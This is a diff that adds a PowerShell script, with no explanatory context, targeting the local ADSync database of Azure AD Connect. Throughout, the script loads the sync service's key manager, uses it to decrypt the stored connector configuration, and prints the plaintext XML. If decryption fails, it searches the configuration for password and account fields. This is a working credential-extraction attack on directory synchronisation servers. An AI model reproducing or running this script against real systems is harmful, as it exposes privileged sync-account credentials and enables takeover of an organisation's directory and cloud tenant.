@@ -1,0 +1,49 @@
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
+$client.Open()
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+
+# Test Extensible2 with active key
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'Extensible2'"
+$reader = $cmd.ExecuteReader()
+
+if ($reader.Read()) {
+    $config_azure = $reader.GetString(0)
+    $crypted_azure = $reader.GetString(1)
+    $reader.Close()
+    
+    Write-Host "=== Testing Active Credential Key ===" 
+    try {
+        $decrypted_azure = $null
+        $key.DecryptBase64ToString($crypted_azure, [ref]$decrypted_azure)
+        Write-Host "SUCCESS - Decrypted XML:"
+        Write-Host $decrypted_azure
+    }
+    catch {
+        Write-Host "Failed: $($_.Exception.Message)"
+        Write-Host "`n=== Trying config XML search ===" 
+        select-xml -Content $config_azure -XPath "//*[contains(., 'password') or contains(., '@')]" | foreach {
+            Write-Host "$($_.Node.Name): $($_.Node.InnerText)"
+        }
+    }
+}
+else {
+    Write-Host "No Extensible2 connector found"
+    $reader.Close()
+}
+
+$client.Close()
